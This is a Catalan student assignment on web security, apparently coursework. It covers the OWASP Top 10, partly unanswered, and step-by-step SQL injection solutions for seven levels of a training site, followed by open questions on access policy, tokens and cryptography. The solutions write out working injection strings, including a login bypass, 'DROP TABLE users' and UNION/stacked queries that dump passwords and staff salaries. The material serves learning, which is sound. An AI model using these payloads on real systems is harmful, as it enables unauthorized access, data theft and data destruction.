# Seguretat i vulnerabilitat

### 1. L’organització [OWASP Foundation](https://owasp.org/Top10/es/) va actualitzar en 2021 el seu Top 10 de vulnerabilitats més trobades en aplicacions web. 
#### Escull 3 vulnerabilitats d’aquesta llista i descriu-les. Escriu l’impacte que tenen a la seguretat i quins danys pot arribar a fer un atac en aquesta vulnerabilitat. Enumera diferents mesures i tècniques per poder evitar-les.
- TOP 1: Perdida de Control d'acces
   
És un error que permet als usuarios actuar fora dels permisos asignats, d'aquesta manera poden accedir a, modificar o esborrar informació o dades o executar una funció fora dels seus limits d'usuarí.  
Es pot donar, per exemple, per no seguir el principi de minim privilegi, en modificar l'url per tal d'accedir per forcar la navegació a pagines no permesses, permitint l'acces o modificació de la conta d'una persona mitjancant nomes l'identificador unic, poder accedir a APIs que no inclouen controls d'acces pels metodes relacionats amb afegir, modificar o eliminar informació...  
Els perills que implica són la fuga d'informació, la modificació o esborrat de dades, entre d'altres, ja que el perill depen sobretot de les interaccions que aconsegueixi dur a terme l'atacant.  

Metodos per evitar-ho: 
Denegar per defecte els accesos als recursos, exceptuan els que hagin de ser publics, afegir un pas extra de verificació a part de l'identificador
  
- TOP 4: Diseny insegur

- TOP :


### 2. Obre el següent enllaç [(sql inseckten)](https://www.sql-insekten.de/) i realitza un mínim de 7 nivells fent servir tècniques d’injecció SQL. 
### 2.1. Copia cada una de les sentències SQL resultant que has realitzat a cada nivell i comenta que has aconseguit.
#### Nivell 1:
En l'espai per al nom d'usuari he posat: jane'; --  
La sentencia resultant ha sigut: SELECT username FROM users WHERE username ='jane'; --' AND password ='d41d8cd98f00b204e9800998ecf8427e';  
He aconseguit accedir a l'usuari amb nom jane  

#### Nivell 2:
En l'espai per al nom d'usuari he posat: jane'; DROP TABLE users; --  
La sentencia resultant ha sigut: SELECT username FROM users WHERE username ='jane'; DROP TABLE users; --' AND password ='d41d8cd98f00b204e9800998ecf8427e';  
S'ha fet DROP a la taula users  

#### Nivell 3:
En l'espai per al nom d'usuari he posat: '; SELECT username FROM users; --  
La sentencia resultant ha sigut: SELECT username FROM users WHERE username =''; SELECT username FROM users;--' AND password ='d41d8cd98f00b204e9800998ecf8427e';  
A logat com maxmiller  

#### Nivell 4:
En l'espai pel nom d'usuari he posat: '; SELECT username FROM users LIMIT 1; --
La sentencia resultant ha sigut: SELECT username FROM users WHERE username =''; SELECT username FROM users LIMIT 1; --' AND password ='d41d8cd98f00b204e9800998ecf8427e';  
A logat com maxmiller  

#### Nivell 5:
En l'espai per la marca de les sabates:  '; SELECT username, password FROM users; --
La sentencia resultant ha sigut: SELECT product_id, brand, size, price FROM shoes WHERE brand=''; SELECT username, password FROM users; --';  
En la taula on hauria de mostrar les sabates m'ha mostrat els noms d'usuari i les respectives contrasenyes  

#### Nivell 6:
En l'espai pel nom d'usuari he posat: '; SELECT salary AS username FROM staff WHERE firstname = 'Greta Maria'; --  
La sentencia resultant ha sigut: SELECT username FROM users WHERE username =''; SELECT salary AS username FROM staff WHERE firstname = 'Greta Maria'; --' AND password ='d41d8cd98f00b204e9800998ecf8427e';  
En la pantalla en que et dona la benvinguda per haber iniciat sessió mostra el salari on hi hauria d'haver el nom d'usuari  
  
#### Nivell 7:
En l'espai: ' UNION SELECT firstname AS product_id, email AS brand, salary AS size, employed_since AS price FROM staff WHERE name = '' OR name != '  
La sentencia resultant ha sigut: SELECT product_id, brand, size, price FROM shoes WHERE brand='' UNION SELECT firstname AS product_id, email AS brand, salary AS size, employed_since AS price FROM staff WHERE name = '' OR name != '';  
En la tula on mostraria l'informació dels productes mostra la informació dels empleats  
  
### 2.2. Enumera i raona diferents formes que pot evitar un atac per SQL injection en projectes fets amb Razor Pages i Entity Framework. 

### 3. L’empresa a la qual treballes desenvoluparà una aplicació web de venda d’obres d’art. Els artistes registren les seves obres amb fotografies, títol, descripció i preu.  Els clients poden comprar les obres i poden escriure ressenyes públiques dels artistes a qui han comprat. Tant clients com artistes han d’estar registrats. L’aplicació guarda nom, cognoms, adreça completa, dni i telèfon. En el cas dels artistes guarda les dades bancaries per fer els pagaments. Hi ha un tipus d’usuari Acount Manager que s’encarrega de verificar als nous artistes. Un cop aprovats poden pública i vendre les seves obres.

#### Ara es vol aplicar aplicant els principis  de seguretat per tal de garantir el servei i la integritat de les dades. T’han encarregat l'elaboració de part de les polítiques de seguretat. Elabora els següents apartats:
1. Definició del control d’accés: enumera els rols  i quin accés a dades tenen cada rol. 
2. Definició de la política de contrasenyes: normes de creació, d’ús i canvi de contrasenyes. Raona si són necessàries diferents polítiques segons el perfil d’usuari.
3. Avaluació de la informació: determina quin valor tenen les dades que treballa l'aplicació. Determina com tractar les dades més sensibles. Quines dades encriptaries?

### 4. En el control d’accessos, existeixen mètodes d’autenticació basats en tokens. Defineix l’autenticació basada en tokens. Quins tipus hi ha? Com funciona mitjançant la web? Cerca llibreries .Net que ens poden ajudar a implementar autenticació amb tokens.

### 5. Crea un projecte de consola amb un menú amb tres opcions:
- Registre: l’usuari ha d’introduir username i una password. De la combinació dels dos camps guarda en memòria directament l'encriptació. Utilitza l’encriptació de hash HA256. Mostra per pantalla el resultat.
- Verificació de dades: usuari ha de tornar a introduir les dades el programa mostra per pantalla si les dades són correctes.
- Encriptació i desencriptació amb RSA. L’usuari entrarà un text per consola. A continuació mostra el text encriptat i en la següent línia el text desencriptat. L’algoritme de RSA necessita una clau pública per encriptar i una clau privada per desencriptar. No cal guardar-les en memòria persistent.
#### Per realitzar aquest exercici utilitza la llibreria System.Security.Cryptography.

### 6. Indica les referències que has consultat
- OWASP Top 10 team (dia de mes de any). OWASP Top 10: 2021. OWASPTop 10:2021 Recuperat el 24/03/2025 d'[aquí](https://owasp.org/Top10/es/#bienvenido-al-owasp-top-10-2021)
- Adriel Araujo (). Vulnerabilidades: Qué es Broken Access Control y cómo solucionarlo. Hackmetrix blog Recuperat el 24/03/2025 d'[aquí](https://blog.hackmetrix.com/broken-access-control/)
